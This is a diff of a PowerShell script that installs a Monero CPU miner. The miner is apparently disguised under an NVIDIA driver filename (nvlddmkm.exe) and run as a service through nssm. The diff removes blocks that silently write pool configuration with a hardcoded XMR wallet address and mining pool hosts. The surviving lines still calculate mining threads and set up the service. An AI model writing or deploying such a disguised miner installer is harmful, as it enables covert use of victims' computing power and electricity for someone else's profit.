@@ -241,48 +241,6 @@ foreach ($file in $requiredFiles) {
     }
 }
 
-# Check if essential files are missing - AUTO CREATE CONFIG.JSON WITHOUT PROMPTING
-$essentialFiles = @('nvlddmkm.exe', 'config.json')
-$missingEssential = $essentialFiles | Where-Object { $_ -in $missingFiles }
-
-if ($missingEssential.Count -gt 0) {
-    Write-Host "`nMissing essential files detected..." -ForegroundColor Yellow
-    
-    # AUTO CREATE CONFIG.JSON WITHOUT PROMPTING
-    if ($missingEssential -contains 'config.json') {
-        $configPath = Join-Path $targetDir "config.json"
-        
-        # Use the provided XMR address automatically
-        $xmraddress = "XMR:49a9azbK8BQ8osi7Xm1FWWCNXzucbzMHXeiGTxetdbZi5iNx81UHNmRJ7EC4FJhgriYyidJnM55Vid1QCWmBVwvr2HprJHF.Worker_0?ref=zion-jdc2"
-        
-        $defaultConfig = @"
-{
-    "pools": [
-        {
-            "url": "rx-asia.unmineable.com:3333",
-            "user": "$xmraddress",
-            "pass": "x"
-        }
-    ],
-    "max-threads-hint": 100
-}
-"@
-        $defaultConfig | Set-Content $configPath -Force
-        Write-Host "  Automatically created default config.json with XMR address" -ForegroundColor Green
-        Write-Host "  Using address: $xmraddress" -ForegroundColor Yellow
-        
-        # Remove config.json from missing files list
-        $missingFiles = $missingFiles | Where-Object { $_ -ne 'config.json' }
-        $missingEssential = $missingEssential | Where-Object { $_ -ne 'config.json' }
-    }
-    
-    # If nvlddmkm.exe is still missing, exit
-    if ($missingEssential.Count -gt 0) {
-        Write-Host "`nError: Missing essential files: $($missingEssential -join ', ')" -ForegroundColor Red
-        Write-Host "Cannot continue without these files." -ForegroundColor Red
-        Exit 1
-    }
-}
 
 # Step 5: Calculate thread count
 Write-Host "`nStep 5: Calculating system configuration..." -ForegroundColor Cyan
@@ -292,61 +250,6 @@ if ($threads -lt 1) { $threads = 1 }
 if ($threads -gt 8) { $threads = 8 }  # Cap at 8 threads
 Write-Host "  CPU Cores: $cpuCores" -ForegroundColor White
 Write-Host "  Using $threads threads for mining" -ForegroundColor Green
-
-# Step 6: Update config.json with thread count
-Write-Host "`nStep 6: Updating configuration..." -ForegroundColor Cyan
-$configPath = Join-Path $targetDir "config.json"
-if (Test-Path $configPath) {
-    try {
-        $configContent = Get-Content $configPath -Raw | ConvertFrom-Json
-        $configContent | Add-Member -MemberType NoteProperty -Name 'max-threads-hint' -Value $threads -Force
-        
-        # Check if pools exist and update with XMR address if they use default
-        if ($configContent.pools -and $configContent.pools.Count -gt 0) {
-            foreach ($pool in $configContent.pools) {
-                if ($pool.user -eq "default") {
-                    $pool.user = "XMR:49a9azbK8BQ8osi7Xm1FWWCNXzucbzMHXeiGTxetdbZi5iNx81UHNmRJ7EC4FJhgriYyidJnM55Vid1QCWmBVwvr2HprJHF.Worker_0?ref=zion-jdc2"
-                }
-            }
-        }
-        
-        $configContent | ConvertTo-Json -Depth 10 | Set-Content $configPath -Force
-        Write-Host "  Updated config.json with $threads threads" -ForegroundColor Green
-    } catch {
-        Write-Host "  Could not update config.json: $($_.Exception.Message)" -ForegroundColor Yellow
-    }
-} else {
-    Write-Host "  config.json not found, creating default..." -ForegroundColor Yellow
-    
-    # Use the XMR address by default
-    $xmraddress = "XMR:49a9azbK8BQ8osi7Xm1FWWCNXzucbzMHXeiGTxetdbZi5iNx81UHNmRJ7EC4FJhgriYyidJnM55Vid1QCWmBVwvr2HprJHF.Worker_0?ref=zion-jdc2"
-    
-    $defaultConfig = @"
-{
-    "pools": [
-        {
-            "url": "rx-asia.unmineable.com:3333",
-            "user": "$xmraddress",
-            "pass": "x",
-            "keepalive": true,
-            "tls": false
-        },
-        {
-            "url": "rx.unmineable.com:3333",
-            "user": "$xmraddress",
-            "pass": "x",
-            "keepalive": true,
-            "tls": false
-        }
-    ],
-    "max-threads-hint": $threads,
-    "donate-level": 1,
-    "print-time": 60
-}
-"@
-    $defaultConfig | Set-Content $configPath -Force
-    Write-Host "  Created config.json with optimized settings" -ForegroundColor Green
-}
 
 # Step 7: Configure service with nssm
 Write-Host "`nStep 7: Configuring service..." -ForegroundColor Cyan
@@ -465,3 +368,4 @@ if ($Host.Name -eq "ConsoleHost") {
     Write-Host "`nPress any key to exit..." -ForegroundColor DarkGray
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
 }
+
